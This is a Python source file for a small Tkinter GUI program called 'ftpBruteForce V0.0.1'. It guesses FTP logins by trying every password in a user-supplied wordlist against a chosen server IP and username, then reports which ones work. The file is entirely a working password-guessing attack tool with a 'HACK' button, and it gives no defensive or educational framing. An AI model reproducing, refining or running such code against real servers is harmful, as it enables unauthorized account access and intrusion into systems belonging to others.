from tkinter import*
import ftplib
from threading import Thread
from tkinter import filedialog

def commandLineConsole(): 
	myBruteForce()
	
def browseFunction():
	root.filename =  filedialog.askopenfilename(initialdir = "/",title = "Select file",filetypes = (("text files","*.txt"),("all files","*.*")))
	pathlabel.config(text=root.filename)	
	global filex
	filex = str(root.filename)
	
def myBruteForce():
	def callback(): # this help the program not to crash
		files = open(filex,"r")#file		
		for line in files.readlines():
			passwd = line
			working = ("\n[+]") + str(user.get()) +("\tAND\t")+ str(passwd)+("\tWORKING\n")
			notWorking = ("\n[-]") + str(user.get()) +("\tAND\t")+ str(passwd)+("\tNOT WORKING\n")
			try:
				ftp = ftplib.FTP(str(ip.get()), timeout = 0.5)# connect to ftp server;
				ftp.login(user.get(), passwd)
				commandLine.insert(END, working)
				break
				ftp.quit()			
			except:
				#pass
				commandLine.insert(END, notWorking)
	t = Thread(target=callback)# this help the program not to crash
	t.start()# this help the program not to crash

root = Tk()
root.resizable(0,0)# removes the maz=ximize button
root.title('ftpBruteForce V0.0.1')
root.configure(background ='#666666')
frame = Frame(root)
label1= Label(root, text="FTP IP ADDRESS", foreground='#8B0000', background='#666666')
#variable for ip
ip = StringVar()
	
entry1= Entry(root, background='#CCCCCC', foreground='#CD0000', textvariable = ip)
labelx1= Label(root, text="LOGIN", foreground='#8B0000', background='#666666')
#variable for login
user = StringVar()
	
entryx1= Entry(root, background='#CCCCCC', foreground='#CD0000', textvariable = user)
label2= Label(root , text="UPLOAD PASSWORD FILE", foreground='#8B0000', background='#666666')
#variable for file
#not yet
#_______________________________$

fileButton= Button(root, text="BROWSE", background='#C2C2C2', foreground='#EE0000', command = browseFunction)
pathlabel = Label(root, text ="file", foreground='#8B0000', background='#666666')
#_______________________________$
frame1 = Frame(root)
commandLine = Text(frame1, background='#CCCCCC', foreground='#CD0000')
scrollbar = Scrollbar(frame1, command=commandLine.yview)
#_______________________________$  
frame2 = Frame(root) 
bruteForce= Button(frame2, text="HACK", background='#C2C2C2', foreground='#EE0000', command = commandLineConsole)

#_______________________________$
label1.pack()
entry1.pack()
labelx1.pack()
entryx1.pack()
label2.pack()

fileButton.pack()
pathlabel.pack()
frame1.pack()
frame2.pack()
scrollbar.pack(side="right", fill=Y)
commandLine.pack()
commandLine['yscrollcommand'] = scrollbar.set
	
bruteForce.pack()
myNickName = Label(root, text ="Brigantins410", foreground='#8B0000', background='#666666').pack(side="right")
#_______________________________$
root.mainloop()
	

	
	

	
	
	
	
	
	
	
	
	
	
	

